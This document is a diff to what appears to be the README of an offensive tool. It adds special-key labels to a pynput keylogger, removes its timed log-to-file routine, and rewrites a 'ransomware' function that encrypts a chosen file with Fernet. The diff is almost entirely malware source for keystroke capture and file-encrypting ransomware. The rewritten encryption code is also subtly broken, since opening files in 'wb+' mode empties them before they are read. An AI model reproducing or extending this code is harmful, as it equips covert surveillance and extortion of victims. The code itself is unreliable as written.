@@ -17,23 +17,36 @@ def on_press(key):
 		if key == key.space:
 			LOG += ' '
 		elif key == key.enter: LOG += '\n'
-		elif key == key.backspace: LOG += ''
+		elif key == key.backspace: LOG += '' 
 		elif key == key.ctrl: LOG += ' ctrl+'
 		elif key == key.tab: LOG += '\t'
 		elif key == key.cmd: LOG += ' cmd+'
+		elif key == key.alt: LOG += ' alt+'
+		elif key == key.caps_lock: LOG += ' CapsLock '
+		elif key == key.delete: LOG += ' Del '
+		elif key == key.down: LOG += ' DownArrow '
+		elif key == key.left: LOG += ' LeftArrow '
+		elif key == key.up: LOG += ' UpArrow '
+		elif key == key.right: LOG += ' RightArrow'
+		elif key == key.esc: LOG += ' esc '
+		elif key == key.home: LOG += ' HomeKey '
+		elif key == key.insert: LOG += ' InsertKey '
+		elif key == key.print_screen: LOG += ' PrintScreen '
+		elif key == key.shift: LOG += ' shift+'
+		elif key == key.f1: LOG += ' F1 '
+		elif key == key.f2: LOG += ' F2 '
+		elif key == key.f3: LOG += ' F3 '
+		elif key == key.f4: LOG += ' F4 '
+		elif key == key.f5: LOG += ' F5 '
+		elif key == key.f6: LOG += ' F6 '
+		elif key == key.f7: LOG += ' F7 '
+		elif key == key.f8: LOG += ' F8 '
+		elif key == key.f9: LOG += ' F9 '
+		elif key == key.f10: LOG += ' F10 '
+		elif key == key.f11: LOG += ' F11 '
+		elif key == key.f12: LOG += ' F12 '
 		else:
 			LOG += str(key)
-
-def log_to_file():
-	if SYSTEM == 'Linux':
-		f = open(LIN_DIR + 'log.txt', 'w')
-		f.write(LOG)
-	else:
-		f = open(WIN_DIR + 'log.txt', 'w')
-		f.write(LOG)
-	cycle = Timer(SECONDS_TO_LOG, log_to_file)
-	cycle.start()
-
 def keylogger():
 	listener = keyboard.Listener(on_press=on_press)
 	try:
@@ -48,33 +61,29 @@ def keylogger():
 ```
 ### Built-in Rasonware Operations
 ```python
-def crypto(action, *request):
-	key_copy = ''
-
-	def encrypt_it():
-		to_encrypt = request
-		with open(to_encrypt, 'rb') as inf:
-			data = inf.read()
-			with open(to_encrypt, 'wb') as ouf:
-				key = Fernet.generate_key()
-				key_copy = key
-				cipher = Fernet(key)
-				cipher_text = cipher.encrypt(data)
-				ouf.write(cipher_text)
-		return r'File encrypted... Key = ' + key_copy + '. Store this key for decryption.'
-	
-	def decrypt_it():
-		to_encrypt, key = request
-		with open(to_encrypt, 'rb') as inf:
-			data = inf.read()
-			with open(to_encrypt, 'wb') as ouf: 
-				cipher = Fernet(key)
-				plain_text = cipher.decrypt(data)
-				ouf.write(plain_text)
-		return r'File Decrypted...'
-		
+def crypto(action: str, *args):
 	if action == 'encrypt':
-		return encrypt_it()
+		to_encrypt = args[0]
+		with open(to_encrypt, 'wb+') as f:
+			data = f.read()
+			key = Fernet.generate_key()
+			cipher = Fernet(key)
+			cipher_text = cipher.encrypt(data)
+			f.seek(0)
+			f.write(cipher_text)
+			f.truncate()
+			return f'  Save the decryption key -> {key.decode()}'
 	else:
-		return decrypt_it()
+		to_encrypt, key = args[0][0], args[0][1]
+		with open(to_encrypt, 'wb+') as f:
+			cipher_text = f.read()
+			cipher = Fernet(key)
+			try:
+				plain_text = cipher.decrypt(cipher_text)
+			except cryptography.fernet.InvalidToken:
+				return '  [-] Invalid key!'
+			f.seek(0)
+			f.write(plain_text)
+			f.truncate()
+			return '  [+] File successfully decrypted!'
 ```
